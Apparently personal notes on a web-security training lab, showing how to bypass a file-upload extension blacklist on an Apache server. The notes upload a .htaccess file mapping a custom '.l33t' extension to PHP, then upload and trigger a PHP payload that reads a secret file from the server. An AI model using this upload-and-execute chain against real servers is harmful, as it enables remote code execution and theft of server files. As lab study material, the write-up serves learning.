
## Lab2 : Config file to overwrite blacklisted extensions ;

As we can see from the response we are dealing with an Apache server : 

![[Screenshot 2025-09-23 at 17.35.42.png]]

As we know , **** Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.  
### 3. Upload malicious `.htaccess` config file

- **Action:** Upload `.htaccess` instead of `.php`. Change body to map custom extension (`.l33t`) → PHP handler.
    
- **Request:**
    
    `POST /my-account/avatar HTTP/1.1 Host: vulnerable-website.com  ------XYZ Content-Disposition: form-data; name="avatar"; filename=".htaccess" Content-Type: text/plain  AddType application/x-httpd-php .l33t ------XYZ--`
    
- **Response:**
    
    `HTTP/1.1 200 OK The file avatars/.htaccess has been uploaded`
    
- **Effect:**  
    Apache now treats any `.l33t` file as PHP (because of `AddType`). ✔️
    

---

### 4. **Upload PHP payload disguised as `.l33t`**

- **Action:** Retry exploit, but rename to `exploit.l33t`.
    
- **Request:**
    
    `POST /my-account/avatar HTTP/1.1 Host: vulnerable-website.com  ------XYZ Content-Disposition: form-data; name="avatar"; filename="exploit.l33t" Content-Type: application/octet-stream  <?php echo file_get_contents('/home/carlos/secret'); ?> ------XYZ--`
    
- **Response:**
    
    `HTTP/1.1 200 OK The file avatars/exploit.l33t has been uploaded`
    
- **Effect:** Upload works because `.l33t` is not blacklisted. ✅


---

### 5. **Trigger the payload**

- **Request:**
    
    `GET /files/avatars/exploit.l33t HTTP/1.1 Host: vulnerable-website.com`
    
- **Response (executed by Apache as PHP, thanks to .htaccess):**
    
    `HTTP/1.1 200 OK Content-Type: text/html  s3cr3t_c0d3_fr0m_carl0s`